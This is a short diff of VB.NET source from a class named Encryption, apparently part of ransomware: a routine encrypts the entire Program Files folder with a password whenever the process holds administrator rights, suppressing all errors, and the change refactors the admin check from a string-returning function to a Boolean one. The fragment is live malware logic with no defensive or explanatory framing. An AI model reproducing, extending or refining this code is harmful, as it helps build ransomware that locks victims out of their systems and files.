@@ -155,7 +155,7 @@ Public Class Encryption
 
     Public Sub Progfiles(ByVal password As String)
         On Error Resume Next
-        If AmiAdmin() = "Administrator" Then
+        If Privileges() = True Then
             encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", password)
         End If
         num += 1
@@ -235,17 +235,17 @@ Public Class Encryption
 
     End Sub
 
-    Public Function AmiAdmin()
+    Public Shared Function Privileges() As Boolean
         Try
             Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
             Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
             If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
-                Return "Administrator"
+                Return True
             Else
-                Return "User"
+                Return False
             End If
         Catch ex As Exception
-            Return "Error"
+            Return False
         End Try
     End Function
 
